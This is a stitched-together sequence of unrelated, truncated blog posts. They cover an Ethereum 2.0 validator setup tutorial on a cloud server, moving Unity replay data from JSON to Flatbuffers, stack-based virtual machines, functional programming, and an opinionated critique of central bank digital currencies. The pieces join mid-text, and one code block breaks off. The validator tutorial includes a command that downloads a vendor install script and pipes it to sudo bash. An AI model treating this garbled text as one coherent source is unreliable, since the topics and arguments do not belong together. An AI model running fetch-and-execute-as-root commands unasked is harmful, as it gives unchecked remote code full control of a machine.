You will also need to <a href="https://pyrmont.launchpad.ethereum.org/generate-keys">select your local machine’s operating system</a> to <a href="https://github.com/ethereum/eth2.0-deposit-cli/releases/">download the CLI</a>. In this post I use Mac, but you can choose whatever OS you use. Open and extract the CLI folder you downloaded from GitHub. Inside that folder, you will find a <code>deposit</code> file. Run this file using: <code>/path/to/deposit new-mnemonic --num_validators 1 --chain pyrmont</code>. Please note:<br>
<code>/path/to/deposit</code> is whenever your downloaded <code>deposit</code> file is.<br>
<code>--num_validators</code> has the number of validators you want to have. Each validator is 32ETH.<br>
<code>pyrmont</code> is the test network. You should change it if you want to work on the main network (aka real money).</p>

<p>Here is example of the output you will have:</p>

<div><div><pre><code><span>&gt;</span> /Users/sagivo/Desktop/eth2deposit-cli-ed5a6d3-darwin-amd64/deposit new-mnemonic <span>--num_validators</span> 1 <span>--chain</span> pyrmont
Please choose your mnemonic language <span>(</span>czech, chinese_traditional, chinese_simplified, english, spanish, italian, korean<span>)</span> <span>[</span>english]: english
Type the password that secures your validator keystore<span>(</span>s<span>)</span>:
Repeat <span>for </span>confirmation:
</code></pre></div></div>

<p>You will be asked to choose a validator password. Do not lose this password, you will need it to get your money back at some point. <strong>This is not your wallet password</strong>, select a new password just for the validator client. After selecting the password you will get a seed phrase to store in case you lost your validator password. Store the seed phase in a secure location as well.<br>
If everything went well you should see a hippo(?) image.<br>
<img src="https://sagivo.com/assets/ethereum-4.png" alt="Ethereum CLI validator"></p>

<p>Open the folder with the keys. In this folder you will find a few files:<br>
<code>deposit_data-[some number].json</code> - this is the information for your deposit.<br>
<code>keystore-[some number].json</code> - you will have one or more files based on the number of validators you selected.
In this stage, you have all you need to install the local clients. Keep this window open, we will get back to it after we install the clients.</p>

<h3 id="ethereum-client-components">Ethereum client components</h3>

<p>Now that you staked your eth, you will need 3 nodes to become ETH 2.0 validator:</p>

<ul>
  <li><strong>ETH 1.0 client</strong>: this client will listen to the Ethereum 1.0 network. You can either run a local client or use a free 3rd party node. To save resources and keep this post simple, I’m using a free <a href="https://dashboard.alchemyapi.io/signup?referral=5f4b22ad-1a24-46af-ab1c-4475e8fe177d">alchemyapi.io</a> node. You can find more 3rd party options <a href="https://ethereumnodes.com/">here</a>.</li>
  <li><strong>Beacon node</strong>: ethereume 2.0 client.</li>
  <li><strong>Validator client</strong>: to validate eth2 transactions.</li>
</ul>

<h3 id="create-eth1-client">Create eth1 client</h3>

<p>You can either create a local eth1 client or use a 3rd party node instead. Let’s use a 3rd party today. Open a free <a href="https://dashboard.alchemyapi.io/signup?referral=5f4b22ad-1a24-46af-ab1c-4475e8fe177d">alchemyapi.io</a> and <a href="https://dashboard.alchemyapi.io/apps">create an app</a>. Make sure you select the <code>Goerli</code> network for your eth1 node.</p>

<p><img src="https://sagivo.com/assets/ethereum-9.png" alt="Alchemyapi node"></p>

<p>After the app has been created go to the app’s page and click on <code>VIEW KEY</code>, you will need to copy the HTTP URL for the beacon node.
<img src="https://sagivo.com/assets/ethereum-10.png" alt="Alchemyapi address"></p>

<h3 id="hosting-your-beacon-node-and-validator-client">Hosting your beacon node and validator client</h3>

<p>You can run your beacon node and validator client on a local computer. Beacon nodes are intended to be high-performance, highly available platforms that can support connections to numerous validator clients and maintain ongoing p2p connectivity with other beacon nodes. As such, their hardware requirements are anticipated to be server-grade CPU/SSD/networking connections.<br>
Your server needs to be available 24/7 or you will accrue penalties and lose ETH. This is why I prefer running my nodes on a hosted cloud server. In this tutorial, I choose <a href="https://m.do.co/c/29d9028f31d1">Digitalocean</a>. After playing with multiple specs, I’ve found that you can run your beacon node and validator client for just $10/month. Use <a href="https://m.do.co/c/29d9028f31d1">this link</a> to sign up for digitalocean and get $100 credit! This should cover your Ethereum staking expenses a while :)</p>

<h3 id="creating-a-digitalocean-droplet">Creating a digitalocean Droplet</h3>

<p>From your Digitalocean account, create a <a href="https://cloud.digitalocean.com/droplets/new">new droplet</a>.<br>
Choose the <code>Ubuntu</code> droplet. This will create a UNIX server running Ubuntu. <img src="https://sagivo.com/assets/ethereum-1.png" alt="Ubunto droplet"></p>

<p>Select the $10/mo plan. The $10/month spec is the bare minimum you should choose. If you want to choose a stronger instance go for it.</p>

<p><img src="https://sagivo.com/assets/ethereum-2.png" alt="10 dollar plan"></p>

<p>Setup SSH access under the <code>Authentication</code> section. This is important to be able to access your server from your terminal.<br>
You can leave the other settings as-is.<br>
Once your droplet setup is completed copy the ip address from the dashboard.<br>
<img src="https://sagivo.com/assets/ethereum-3.png" alt="copy ip"></p>

<h3 id="setting-up-your-cloud-server">Setting up your cloud server</h3>

<p>By now you should have a running digital ocean server and you should have generated <code>validator_keys</code> locally using the CLIt. Now let’s access your digital ocean machine to set it up.
First, let’s copy your local <code>validator_keys</code> folder to your hosted server.</p>

<div><div><pre><code>scp <span>-pr</span> /path/to/your/local/validator_keys <a href="https://sagivo.com/cdn-cgi/l/email-protection" data-cfemail="e5978a8a91a5818c828c918489">[email&nbsp;protected]</a>_ocean_ip:/validator_keys
</code></pre></div></div>

<ul>
  <li><code>/path/to/your/local/validator_keys</code>: the path for your local folder containing the generated validator keys.</li>
  <li><code>digital_ocean_ip</code>: your digitalocean machine’s IP.</li>
</ul>

<p>Now that we copied the keys to the droplet (digitalocean instance), let’s SSH into this machine.</p>



<ul>
  <li><code>digital_ocean_ip</code>: your new machine’s IP.</li>
</ul>

<p>The first (optional) step is to enable better metrics on the machine to track later in digitalocean. This will let you inspect CPU, memory, disk I/O, and other metrics in the digitalocean dashboard.</p>

<div><div><pre><code>curl <span>-sSL</span> https://repos.insights.digitalocean.com/install.sh | <span>sudo </span>bash
</code></pre></div></div>

<h3 id="install-lighthouse">Install Lighthouse</h3>

<p>In this step, we will install lighthouse on your new server. <a href="https://github.com/sigp/lighthouse">Lighouse</a> is an open-source Ethereum 2.0 client, written in <a href="https://www.rust-lang.org/">Rust</a> and maintained by Sigma Prime.</p>

<ol>
  <li>Go to the <a href="https://github.com/sigp/lighthouse/releases">Lighthouse releases page</a> and select the latest linux release.</li>
  <li>Download the portable binary <code>wget lighthouse-${VERSION}-x86_64-unknown-linux-gnu-portable.tar.gz</code>.</li>
  <li>Extract the archive: <code>tar -xvf lighthouse-${VERSION}-x86_64-unknown-linux-gnu.tar.gz</code></li>
  <li>Test the binary with <code>./lighthouse --version</code> (it should print the version).</li>
  <li>Move the lighthouse binary to a location in your PATH, so the lighthouse command can be called from anywhere: <code>cp lighthouse /usr/bin</code></li>
  <li>
    <p>Clean your downloaded files</p>

    <div><div><pre><code><span>rm </span>lighthouse
<span>rm </span>lighthouse-<span>${</span><span>VERSION</span><span>}</span><span>-x86_64-unknown-linux-gnu</span>.tar.gz
</code></pre></div>    </div>
  </li>
</ol>

<h3 id="import-validator-keys">Import validator keys</h3>

<p>We will import the validator keys so we can use them by the validator.</p>

<div><div><pre><code><span>mkdir</span> <span>-p</span> /var/lib/lighthouse
lighthouse account validator import <span>--directory</span> /validator_keys <span>--datadir</span> /var/lib/lighthouse
</code></pre></div></div>

<ul>
  <li><code>/var/lib/lighthouse</code>: this folder will store our lighthouse data.</li>
  <li><code>--directory /validator_keys</code>: our imported <code>validator_keys</code> folder locaiton.</li>
</ul>

<p>You will be prompted to insert a password. Insert the password for your validator client again.</p>

<h3 id="run-beacon-node">Run beacon node</h3>

<p>We will run the beacon node as a daemon service. This way it will auto-restart if there’s an error. It’s important to have your eth 2.0 service running 24/7 to not accrue penalties and lose eth.</p>

<div><div><pre><code>nano /etc/systemd/system/lighthousebeacon.service
</code></pre></div></div>

<p>Paste this text:</p>

<div><div><pre><code>[Unit]
Description=Lighthouse Eth2 Client Beacon Node
Wants=network-online.target
After=network-online.target

[Service]
Type=simple
Restart=always
RestartSec=5
ExecStart=/usr/bin/lighthouse bn --network pyrmont --staking --datadir /var/lib/lighthouse --eth1-endpoints https://eth-goerli.alchemyapi.io/v2/[your token]

[Install]
WantedBy=multi-user.target
</code></pre></div></div>

<p>This is a new service that will re-start if it fails.</p>

<ul>
  <li><code>--network pyrmont</code>: we use the test network</li>
  <li><code>--eth1-endpoints</code>: comma-separated http addresses of your eth1 client nodes.</li>
</ul>

<p>To reload the daemon use</p>



<p>Now let’s start the beacon daemon service:</p>

<div><div><pre><code>systemctl start lighthousebeacon
</code></pre></div></div>

<p>You can inspect the output using (safe to ctr+c once you’re done):</p>

<div><div><pre><code>journalctl <span>-fu</span> lighthousebeacon.service
</code></pre></div></div>

<p>Also, let’s enable the service to start on server restart:</p>

<div><div><pre><code>systemctl <span>enable </span>lighthousebeacon
</code></pre></div></div>

<h3 id="validator-client">Validator client</h3>

<p>Let’s create a validator service</p>

<div><div><pre><code>nano /etc/systemd/system/lighthousevalidator.service
</code></pre></div></div>

<p>Paste this:</p>

<div><div><pre><code>[Unit]
Description=Lighthouse Eth2 Client Validator Node
Wants=network-online.target
After=network-online.target

[Service]
Type=simple
Restart=always
RestartSec=5
ExecStart=/usr/bin/lighthouse vc --network pyrmont --datadir /var/lib/lighthouse --graffiti "YOLO"

[Install]
WantedBy=multi-user.target
</code></pre></div></div>

<p>This is a new service that will re-start if it fails.</p>

<ul>
  <li><code>--network pyrmont</code>: we use the test network</li>
  <li><code>--graffiti</code>: an optional message you want to include in your validation blocks.</li>
</ul>

<p>To reload the daemons use</p>



<p>Start the validator daemon service.</p></div></article></div></div></div>

<p>We recently switched from downloading and parsing JSON in our Unity client to a binary format based on Flatbuffers.
In this this article you are going to learn:</p>

<ul>
  <li><em>why</em> we did that</li>
  <li><em>what</em> Flatbuffers is anyway</li>
  <li><em>how</em> you can do that yourself</li>
  <li>what <em>benefit</em> we gained</li>
</ul>

<p><strong>TL;DR</strong></p>

<p>You are looking to simplify your life integrating Flatbuffers in Unity? Look no further: <a href="https://github.com/gameroasters/flatbuffers-unity-docker">gameroasters/flatbuffers-unity</a></p>



<p>Our recent game <em>Wheelie Royale</em> (<a href="https://apps.apple.com/US/app/id1518264893">Appstore</a> / <a href="https://play.google.com/store/apps/details?id=com.gameroasters.wheelieroyale&amp;hl=en&amp;gl=US">Playstore</a>) downloads a lot of replay data by other players. Replay data was transmitted in JSON format. In the most extreme cases up to 15mb of JSON for a single level.
While this is already a problem just because of mobile data usage it manifests even more severly in mid- to low-end devices when deserializing the JSON data.</p>

<p>After digging out my low-end test device (Galaxy S4) it took <a href="https://www.newtonsoft.com/json">Newtonsoft.JSON</a> <strong>20 sec</strong> to deserialize the 15mb. This is bad and for some players it even went up to a minute - an absolute dealbreaker.</p>

<p>Obviously we had to find a better method entirely.</p>



<blockquote>
  <p>FlatBuffers is an efficient cross platform serialization library (<a href="https://google.github.io/flatbuffers/">Flatbuffers website</a>)</p>
</blockquote>

<p>Initially a Google internal project for game development it received some fame when Facebook announced massive performance gains by utilizing it on their mobile app (<a href="https://engineering.fb.com/2015/07/31/android/improving-facebook-s-performance-on-android-with-flatbuffers/">article</a>).</p>

<p>Using Flatbuffers gives us two main advantages:</p>

<ol>
  <li>Data is stored in binary form making it easy on the bandwidth</li>
  <li>Accessing Data is very fast since it is just a lookup from contiguous memory</li>
</ol>

<p>The following graphic visualizes this:</p>

<p><img src="http://extrawurst.github.io/assets/flatbuffers/fb.jpeg" alt="fb"></p>

<p>Flatbuffers store data in a <strong>contiguous</strong> chunk of memory making it also easy on the garbage collector that especially in our use case was trashed with a lot of small allocations.
If you mainly read your data from a buffer and do not need to alter it (our exact use case) it escentially reduces allocations to zero (reusing a static buffer).</p>

<p>Aside the compact memory layout Flatbuffers reduces the memory consumption by expecting both parties to know the schema. We later see how we generate code for client and backend to be able to speak the same <em>language</em>.</p>

<h2 id="comparison">Comparison</h2>

<ul>
  <li><strong>Before</strong>: Deserializing 15mb of Json in <strong>20 secs</strong></li>
  <li><strong>After</strong>: Parsing the same data but using Flatbuffers (4mb) in <strong>0,5 sec</strong></li>
</ul>

<p>This is a speed improvement of <strong>40x</strong>.</p>

<p><strong>Disclaimer</strong>: Of course this is not a proper scientific benchmarking method but it holds true even on our modern iPhones (albeit on a much smaller scale). I leave the more scientific methods of benchmarking to people smarter than me: 
<a href="https://google.github.io/flatbuffers/flatbuffers_benchmarks.html">benchmark</a></p>



<p>Here is a simplified version of our schema file. Keep in mind that we are dealing with playbacks (ghosts) of other players. Each ghost consists of a TON of deltas (Sample) that allow us to replay them.</p>

<pre><code>struct Sample {
  //...
  r: int16;
}

table GhostRecording {
  //...
  deltas: [Sample] (required);
}

table Ghost {
  //...
  recording: [GhostRecording] (required);
}

table Ghosts {
  //...
  items:[Ghost] (required);
}

root_type Ghosts;
</code></pre>

<p>Here you can see why our use case was particularly tough for the garbage collector in Unity since we are dealing with a lot of small individually allocated objects.</p>

<p>If you want to to more about the differences of <code>table</code> and <code>struct</code> you can find all details about the schema here: <a href="https://google.github.io/flatbuffers/flatbuffers_guide_writing_schema.html">Flatbuffers Schema</a></p>

<h2 id="code-generation">Code generation</h2>

<p>When it comes to the pipeline required to get this working I was disappointed at how little was available: no easy docker container to get <code>flatc</code> (the schema transpiler) working cross platform, no ready built .net library for Unity to get started.</p>

<p>So I built this and open sourced it on our company github: <a href="https://github.com/gameroasters/flatbuffers-unity-docker">gameroasters/flatbuffers-unity</a></p>

<p>Using this docker container it is easy to create your serialization/deserialization code using the following snippet:</p>

<div><div><pre><code>docker run <span>-it</span> <span>-v</span> <span>$(</span>shell <span>pwd</span><span>)</span>:/fb gameroasters/flatbuffers-unity:v1.12.0 /bin/bash <span>-c</span> <span>"cd /fb &amp;&amp; </span><span>\</span><span>
	flatc -n --gen-onefile schema.fbs &amp;&amp; </span><span>\</span><span>
	flatc -r --gen-onefile schema.fbs"</span>
</code></pre></div></div>

<p>This will mount your current working directory into the container, it is expecting to find a <code>schema.fbs</code> file in here and generate the necessary code for <em>Rust</em> and <em>CSharp</em> for you in two files called <code>schema.rs</code> and <code>schema.cs</code>.</p>



<p>Flatbuffers is not going to make your code more readable. Here is an example how we read in our ghosts from it:</p>

<div><div><pre><code><span>var</span> <span>fb_ghosts</span> <span>=</span> <span>GR</span><span>.</span><span>WR</span><span>.</span><span>Schema</span><span>.</span><span>Ghosts</span><span>.</span><span>GetRootAsGhosts</span><span>(</span><span>new</span> <span>ByteBuffer</span><span>(</span><span>data</span><span>));</span>

<span>var</span> <span>res</span> <span>=</span> <span>new</span> <span>List</span><span>&lt;</span><span>Ghost</span><span>&gt;(</span><span>fb_ghosts</span><span>.</span><span>ItemsLength</span><span>);</span>
<span>for</span> <span>(</span><span>var</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>fb_ghosts</span><span>.</span><span>ItemsLength</span><span>;</span> <span>i</span><span>++)</span>
<span>{</span>
    <span>var</span> <span>e</span> <span>=</span> <span>fb_ghosts</span><span>.</span><span>Items</span><span>(</span><span>i</span><span>);</span>
    <span>if</span> <span>(!</span><span>e</span><span>.</span><span>HasValue</span><span>)</span> <span>continue</span><span>;</span>
    <span>var</span> <span>recording</span> <span>=</span> <span>e</span><span>.</span><span>Value</span><span>.</span><span>Recording</span><span>.</span><span>Value</span><span>;</span>

    <span>{</span>
        <span>var</span> <span>delta</span> <span>=</span> <span>recording</span><span>.</span><span>Deltas</span><span>(</span><span>j</span><span>);</span>
        <span>var</span> <span>r</span> <span>=</span> <span>delta</span><span>.</span><span>Value</span><span>.</span><span>R</span><span>;</span>
        <span>deltas</span><span>.</span><span>Add</span><span>(</span><span>new</span> <span>Sample</span><span>(</span><span>r</span><span>));</span>
    <span>}</span>

    <span>var</span> <span>ghost</span> <span>=</span> <span>new</span> <span>Ghost</span><span>();</span>
    <span>ghost</span><span>.</span><span>recording</span> <span>=</span> <span>new</span> <span>GhostRecording</span><span>();</span> 
    <span>ghost</span><span>.</span><span>recording</span><span>.</span><span>deltas</span> <span>=</span> <span>deltas</span><span>;</span>
  
    <span>res</span><span>.</span><span>Add</span><span>(</span><span>ghost</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<p>Unlike some alternatives to Flatbuffers it does not create the Plain-Old-Data (POD) objects for you and deserialize into those. But that is by design. You could actually go without them when you only need to access it for reading.</p>

<p>We only create those to keep the code compatible with the previous approach that deserialized JSON into POD objects.</p>



<p>Of course there are alternatives that I do not want to hide:</p>

<ul>
  <li><a href="https://developers.google.com/protocol-buffers">protobuf</a></li>
  <li><a href="https://github.com/capnproto/capnproto">cap’n’proto</a></li>
</ul>

<p>Here is a very nice comparison matrix: https://capnproto.org/news/2014-06-17-capnproto-flatbuffers-sbe.html</p>

<p>The main benefit for <strong>protobuf</strong> is that it does the extra step of creating POD objects for you bringing it even closer to what you are used to in regular JSON deserialization. It is a good tradeoff between speed (Flatbuffers) and convenience (JSON). Another nice thing is: protobuf also speaks JSON which simplifies debugging a lot.</p>

<p>The other alternative - <strong>cap’n’proto</strong> - is actually made by the <a href="https://stackoverflow.com/a/25370932/1397367">same guy</a> who made protobuf and uses the same zero-allocation approach Flatbuffers uses. <strong>cap’n’proto</strong> does not support as many languages yet - thats the only reason I did not consider giving it a try (yet).</p>

<p>Ultimately there is no <em>best</em> solution, everything comes at a cost. If you need raw speed there is not much more you can get compared to Flatbuffers.</p>

<p>In this series we’re going to delve a bit into stack based virtual machines. First we’re going to see an overview, then we’ll build our own toy VM. Next, we’re going to see how what we’ll build maps to a real CPU. Finally, we’ll discuss the most famous of all: the JVM.</p>

<h3 id="introduction">Introduction</h3>

<p>What’s a <em>stack based virtual machine</em> then? It’s an abstraction of a computer, that emulates a real machine. Generally it is built as an interpreter of a special <em>bytecode</em>, that translates its in real time for execution on the CPU.</p>

<p>Let’s start with a trivial example: suppose your program needs to add two numbers. To do that in a stack VM, the program will <em>push</em> the first number to the stack, <em>push</em> the second and then execute some form of the special instruction <em>add</em>, that will <em>pop</em> the first two elements of the stack and replace them with their sum. Let’s see it step by step:</p>

<p><img src="https://andreabergia.com/images/2015/03/Stack_1.png" alt="At the beginning"></p>

<p>The <code>SP</code> is the <em>stack pointer</em>, which refers to the head of the stack. The <code>IP</code> is the <em>instruction pointer</em>, which points to the address of the current instruction to execute. Let’s now execute the first instruction:</p>

<p><img src="https://andreabergia.com/images/2015/03/Stack_2.png" alt="After the first instruction"></p>

<p>You can see that the stack now contains <code>1</code> and that the instruction pointer has been moved to the next instruction. Let’s now simulate the second instruction:</p>

<p><img src="https://andreabergia.com/images/2015/03/Stack_3.png" alt="After the second instruction"></p>

<p>Finally we can execute the <code>add</code> instruction:</p>

<p><img src="https://andreabergia.com/images/2015/03/Stack_4.png" alt="After the add"></p>

<p>The head of the stack and the previous element have been popped and replaced with their sum.</p>

<h3 id="centrality-of-the-stack">Centrality of the stack</h3>

<p>As you have seen from the example, the main two data structures for a stack VM are the code listing, with the instruction pointer, and the stack data, which is accessed only via the stack pointer. While these two data structures seem trivial, they are more than enough to implement a lot of complex programs. By adding some external memory area (what is generally known as “memory on the heap”), this structure will become complex enough to form the basis of a real language such as Java or Scala.</p>

<p>The stack will be the central structure. From what we hve seen above you should have some idea on how to use it to implement the basic arithmetic, but it is also going to be the basis of implementing loops and conditional execution (if) and even function calls! We’re going to discuss all of this while building our toy VM.</p>

<h3 id="register-based-virtual-machines">Register based virtual machines</h3>

<p>Closely related to stack based VM are <em>register based virtual machines</em>. They are also interpreters of bytecode, but their design is quite different, since they don’t use the stack for the operands but rather a set of registers. While they tend to be more complex, they are also generally faster at runtime, since they map much more closely to the CPU (which, as we’ll see later, is actually an hardware register machine) and thus they tend to generate and execute better efficient code.</p>

<p>However stack based virtual machines are not just a learning toy. The most successful VM ever, the <a href="https://en.wikipedia.org/wiki/Java_virtual_machine">Java Virtual Machine</a>, is a stack-based virtual machine (and so is the <a href="https://en.wikipedia.org/wiki/Common_Language_Runtime">CLR</a>, the basis of .NET). Furthermore the JVM is <em>extremely</em> high performant, while still quite simple - although that has been achieved more by the <em>immense</em> amount of money that has flown into its development than by some special characteristic of its architecture.</p>

<p>The most famous example of a register based virtual machine is probably <a href="http://www.lua.org/">LUA</a>, which can achieve <a href="http://luajit.org/performance.html">amazing performances</a> and is used in <a href="https://en.wikipedia.org/wiki/Category:Lua-scripted_video_games">many videogames</a> as a scripting language.</p>

<p>A quick google search on “Why functional programming” or “why functional programming matters” will yield quite insightful results. Having that said, I still believe there is more to add to this topic. And what would be my answer to these questions? One word: <strong>purity</strong> (or Statelessness). 
Before delving into purity let’s dissect the <strong>function</strong> in the functional programming paradigm.</p>



<p>Many years ago, when I first heard the term functional programming, I was very confused. I said, “Hey, I have been using C, we already have functions there. JavaScript also has functions, as many OOP languages
have functions disguised as methods of the objects. So why is this new term?”</p>

<p>Well, my first mistake was functional programming wasn’t really a new term. The conceptual origin of functional programming
<strong>lambda calculus</strong> is developed as early as 1930 by Alonzo Church and the first functional programming language LISP was available by the late ’50s. So functional programming wasn’t
something new at all. My second mistake was the confusion of the term “functional”. The word function here does not represent the procedures which we call functions in the programming languages but rather it refers to the mathematical functions just like Sine and Cosine. And it is <strong>purity</strong> that makes these mathematical functions different than the functions in those imperative programming languages. That is, for a pure function, given the same input that function will always yield the same output without any side effects.</p>

<p>For example, sin(90) will always yield 1 as a result, no matter when or how many times you call. Such function calls also have no side effects, that is, pure function calls will not alter anything you care about.</p>

<p>On the contrary, imperative programming languages will not constrain your functions to be pure.</p>

<p>There is a common argument associated with the functional programming paradigm, that it is mostly applicable for mathematics and science or finance, but how about the real-world line of business applications? In fact, the line of business applications is precisely where functional programming shines. But before claiming functional programming is the holy grail let’s review some misconceptions about functional programming.</p>

<h2 id="misconceptions-about-functional-programming">Misconceptions about functional programming</h2>

<p>When we ask developers, what are the characteristics of good code or a good programming language, it is likely you would hear the following:</p>

<ul>
  <li>Good code is more maintainable.</li>
  <li>Good code leads to better readability.</li>
  <li>Good code tends to be shorter and concise.</li>
  <li>Good code is testable and dependencies are isolatable.</li>
  <li>Good code is extendable.</li>
  <li>Good code is less buggy.</li>
</ul>

<p>Functional programming is not some sort of code nor it is a language but a paradigm. You could probably go with functional programming by using any language. However, some languages embrace it as a first-class citizen (or even dictate it) whereas some languages tend to be challenging or they become too verbose to go with functional programming. Thus above items about the good code
are not really relevant to the functional programming paradigm. I would like to emphasize once more the following:</p>

<ul>
  <li>Functional programming <strong>does not</strong> necessarily lead to more maintainable code nor does it aim that.</li>
  <li>The code written with functional programming languages <strong>are not</strong> necessarily more readable.</li>
  <li>The practice of functional programming can also turn the code into spaghetti if one is not careful.</li>
</ul>

<p>Wow, if functional programming doesn’t give me those aspects I care about in my code, then why should I use it all?</p>

<h2 id="why-should-i-care-about-functional-programming">Why should I care about functional programming?</h2>

<p>We have discussed functional programming does not necessarily lead to better code. So why bother? The answer is, functional programming keeps the developer sane and you will sleep better!
Let’s see how with an example. Suppose that we have a Car class with a public property Color and two public methods Run() and Stop(). The Run method does whatever internally necessary to run the car.</p>

<p><img src="https://onurgumus.github.io/assets/posts/2020-12-26-Functional-Programming/class-diagram.png" alt="Car"></p>

<p>Now we do:</p>
<pre><code>var car = new Car();
car.Run();
... //do other things.
SomeOtherFunction(car);
//Did SomeOtherFunction stopped the car? I don't know I have to track it.
... //other things

SomeOtherFunction(Car car){
  //hmm have I run the car before? I have to track it.
  car.Run();
  //now I have how to run the car perhaps more than one time. What's gonna happen?
}
</code></pre>

<p>We have 3 problems here:</p>

<p>1- As the author of SomeOtherfunction how will I know if the Run method was called before? I need to look up the caller’s code thus it’s an <strong>extra burden</strong> to the developer to find it out. 
One might argue, we could add an IsRunning property, however, nothing forces me at compile time to check that. I could easily forget doing such a check. And not always
such properties and methods are related. So I am <strong>burden</strong>ed with reviewing the caller’s code. Worse, in case <strong>SomeOtherFunction</strong> is a public surface for my API, I have to be extra careful. I have to resort to defensive programming, document my API, clearly describe the expected input state, and pray for the caller to read the docs.</p>

<p>2- What happens if I call Run twice. Will it throw an exception? Will it ignore? The only way to find out is either read the relevant API for the Car class or read the source. 
Hence we have another <strong>burden</strong> here.</p>

<p>3- After SomeOtherFunction returns how do I know if the car is stopped or not.  Again we have to read the docs or the source for the SomeOtherFunction and yet another <strong>burden</strong> here.</p>

<p>So you can observe such a simple code brings a lot of responsibility to the developer that he has to track and remember the state at various stages of the coding process. 
It could be easy to remember for one object but if you have lots of objects circulating deep into the code, it may drive you nuts.</p>

<p>How do we solve this problem? Well, the problem is about <strong>state tracking</strong> and if we didn’t have the state in the first place, we wouldn’t have that problem.</p>

<h2 id="the-functional-solution">The functional solution</h2>

<p>So we want to get rid of the state. Perhaps a way to do so is to represent the state by using the types. So instead of a single Car type, we could utilize two different types: <strong>StoppedCar</strong> and a <strong>RunningCar</strong>. Then we have a <strong>run</strong> function that is taking a <strong>StoppedCar</strong> and returning a <strong>RunningCar</strong>:</p>

<p><img src="https://onurgumus.github.io/assets/posts/2020-12-26-Functional-Programming/run.png" alt="Run-function"></p>

<p>Once we define such a run function, we solve all three problems. First, we always know that if the car is running:</p>

<div><div><pre><code><span>SomeOtherFunction</span><span>(</span><span>RunningCar</span> <span>car</span><span>){</span>
 <span>//we know for sure the car is running</span>

<p>And obviously, we cannot call the run function again since the code won’t compile. And depending on the return type the caller will know what state has been returned.
Now as developers, we have fewer things to track, fewer things to worry about. Now life is so easy! Or is it?</p>

<h2 id="if-functional-programming-is-so-good-why-it-is-not-popular">If functional programming is so good why it is not popular?</h2>

<p>Well, the first thing to acknowledge is functional programming is not about syntax. It’s a paradigm. For example, recently C# 9 has attained the record syntax, a record is a functional concept
and if you are not familiar with the functional paradigm, you might be confused about why we need records in the first place. You will only see unconvincing answers like records are good because they are immutable (the real answer is they provide value semantics and referential transparency, thus we don’t care about the memory location, whereas immutability is only a vehicle to achieve these).</p>

<p>What I am trying to say is to get started with functional programming, you have to forget about most things you already know about imperative programming. 
So it is literally baby steps again and it would take quite a while to master it. And that is one of the major reasons people shy away from functional programming.</p>

<p>In the imperative world we have statements that tell the compiler what to do:</p>

<ul>
  <li>do this;</li>
  <li>do that;</li>
</ul>

<p>Whereas functional programming is more like movie frames. Each frame is immutable and unchangeable but if we roll 24 frames per second. It creates the illusion of a movie.</p>

<p><img src="https://onurgumus.github.io/assets/posts/2020-12-26-Functional-Programming/frames.png" alt="frames"></p>

<p>Functional programming does the same. We never change the data but every time we need a change things we create a new instance of that type. And obviously, that’s a lot of CPU cycles and memory allocation compared to the imperative approach and 30 years ago that really mattered. 30 years ago, your colleagues would say, “Whoa! Are you allocating 200 bytes just to change the status of a car?” But these days, it is <strong>engineers are expensive and servers are not</strong>. Now, your users are unlikely to notice a few hundred nanoseconds delay. But you could utilize the hardware power for the sake of programmer productivity. Thanks to immutability, functional paradigm even scales better when you have a  distributed and/or multi-threaded environment. But these historical problems regarding the resource consumption associated with functional programming allowed the imperative paradigm to flourish whereas people remained skeptical with the functional programming.</p>

<p>Having a smaller community leads to fewer examples, fewer resources, less tooling. You can find a lot of articles, books talking about, Functional programming, but try to find a functional sample application for something a simple to-do list that persists the data to the database. You will be mostly out of luck. You might try to fallback trying to use your old tools like ORMs. But then you will be frustrated and ask yourself why to bother with the functional way at all. Indeed, CQRS with event sourcing is perhaps one of the correct ways to persist the data in functional programming, instead of ORMS. Aaaand you have another thing to learn!</p>

<p>Combined with the relearning process described, functional programmers are a minority among the developer community. Having that said, today’s challenges require complicated solutions, and solutions like reactive programming are going more and more popular. Probably one of the most famous and demanded javascript libraries is React. React is …</p></section></div></div></div>

This is because blockchains and blockchain-inspired distributed ledger technologies are built on a single, common, ledger, which is distributed either in a permissionless or permissioned manner. The permissionless distribution exposes a lot of information about the network participants, but in combination with proof-of-work verification makes it very difficult for an adversary to attack and overtake the network and e.g. change the inflation rate.</p><p>Permissioned network with no proof-of-work or similar consensus algorithm not only doesn’t provide the immutability feature but by having a single permissioned ledger gives potential control to those who grant the network privileges. As a result, the central bank as the ultimate permission issuer would have much stronger control over the monetary system and payment network than they have right now. This gives the central banks three very dangerous capabilities.</p><h2>Helicopter Money</h2><p>The reason why we’ve seen such an elevated business cycle over the past century is the central banking fiat money system. Unnatural expansion of the money supply causes booms, which are unsustainable and markets try to clear them when they are exposed as such.</p><p>Economists of the Austrian school understand, that the boom is the real problem and the economic crisis is the necessary and positive cleansing mechanism. Unfortunately, the (neo)Keynesian response to such an event is to prop the markets up by further monetary interventions.</p><p>However, the current design of the banking system requires the intermediary role of commercial banks in issuing credit to businesses. Central banks get frustrated when the commercial banks exercise caution in an economy, which hasn’t fully cleared the previous misallocations and hasn’t brought prices of capital goods to more sustainable levels.</p><p>Furthermore, since the predominant Keynesian narrative is that spending drives the economy (hint: it doesn’t - capital investments do), the central banks would like to spur more consumer spending by issuing money supply directly to consumers. Needless to say, commercial banks’ cautious approach to consumer credit in a period of growing unemployment doesn’t align well with the central bank’s goals either. During the COVID crisis, the governments managed to an extent to get around these hurdles by issuing benefits en masse, but those are complicated by logistics, bureaucracy, or legislation.</p><p>By closer integration of the monetary spigot to the end consumers and businesses, the central bank can much more easily issue credit, or just outright cashouts to the private individuals and commercial entities by simply “airdropping” new tokens to the existing token identities. They would not even compromise their stated intention of keeping the commercial banks in the picture - those would still serve as custodians of the token keys, and even have the ability to issue credit along the traditional lines.</p><p>This would lead to disastrous consequences. Economies get easily addicted to central banks’ money dope. With every new crisis, the chief monetarists had to increase intervention doses the same way as junkies have to do with their drug of choice. As with every addiction, the longer it lasts and the stronger it grows, the more difficult it is to cure it. And while monetary overdose such as we’ve seen in Zimbabwe or Venezuela might not come for a long time, if ever, junkies don’t perform well, as Japan’s three lost decades of BOJ’s interventions have demonstrated.</p><h2>Negative Interest Rates</h2><p>Hoarding is evil - or so the modern monetarists’ narrative goes. In the Keynesian framework, there is no space for the function of cash as a hedge in times of uncertainty. Savings accounts, in their minds, are just money that doesn’t work in spurring the miracles of spending- and 